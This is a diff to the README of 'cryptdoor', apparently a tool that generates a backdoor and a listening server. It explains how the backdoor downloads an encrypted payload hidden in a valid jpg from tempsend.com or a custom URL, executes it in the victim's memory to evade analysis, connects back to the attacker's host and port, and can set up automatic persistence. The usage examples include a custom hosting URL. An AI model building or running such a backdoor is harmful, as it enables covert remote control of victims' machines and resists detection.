@@ -16,43 +16,52 @@ The main body of backdoor code is hosted at a url and download at runtime by the
 This means that the actual backdoor code only exists in the victim memory.  
 The backdoor payload can be hosted on tempsend.com or at a custom url and downloaded and exec'ed at runtime by the 
 backdoor.py script.  
-This means the actual backdoor code is not included in the final backdoor.py and is therefore further resistant to 
-analysis.  
 The code will be hidden in a jpg that remains valid so it can be viewed.  
 The key for decrypting the payload code is kept in the downloader, so if anyone finds it online, they will not be able
-to decrypt it.
+to decrypt it.  
 
 Usage
 =========
 
-        usage: ./cryptdoor.py [options]
+    usage: ./cryptdoor.py [options]
 
-        optional arguments:
-          -h, --help            show this help message and exit
-          -i HOSTNAME, --hostname HOSTNAME
-                                Ip or hostname to connect back to.
-          -p PORT, --port PORT  Port to connect back to.
-          -e EXPIRE, --expire EXPIRE
-                        Payload Life: h=hour, d=day, w=week, m=month
-          -u CUSTOMURL, --customurl CUSTOMURL
-                        Host the generated jpg at this url.
-          -a, --persistence     Enable Auto-persistence.
-          -b BACKDOORNAME, --backdoorname BACKDOORNAME
-                                Name of backdoor (default backdoor.py).
-          -s SERVERNAME, --servername SERVERNAME
-                                Name of server (default server.py).
-
+    optional arguments:
+      -h, --help            show this help message and exit
+      -i HOSTNAME, --hostname HOSTNAME
+                            Ip or hostname to connect back to.
+      -p PORT, --port PORT  Port to connect back to.
+      -e EXPIRE, --expire EXPIRE
+                            Payload Life: h=hour, d=day, w=week, m=month
+      -u CUSTOMURL, --customurl CUSTOMURL
+                            Host the generated jpg at this url.
+      -f CUSTOMIMAGE, --customimage CUSTOMIMAGE
+                            Backdoor this jpg instead of a random choice from
+                            stubs/images.
+      -a, --persistence     Enable Auto-persistence.
+      -b BACKDOORNAME, --backdoorname BACKDOORNAME
+                            Name of backdoor (default backdoor.py).
+      -s SERVERNAME, --servername SERVERNAME
+                            Name of server (default server.py).
 
 cryptdoor.py will make the backdoor and server.
-The syntax is:
+The most simple syntax is:
 
-        ./cryptdoor.py -i host -p port
+        ./cryptdoor.py -i host -p port -e d
 
 You can add a -a to attempt automatic persistence:
 
-        ./cryptdoor.py -i host -p port -a
+        ./cryptdoor.py -i host -p port -e d -a
+
+Use your own jpg as the backdoor:
+
+        ./cryptdoor.py -i host -p port -e d -f lol.jpg
+
+Host the produced jpg at a custom url instead of uploading to tempsend:
+
+        ./cryptdoor.py -i host -p port -u http://myddns.us.to/cat.jpg
 
 host and port refer to the host and port of the listening server (attacker).  
+
 These are the options you have from within the shell:
 
 	AES-shell options:
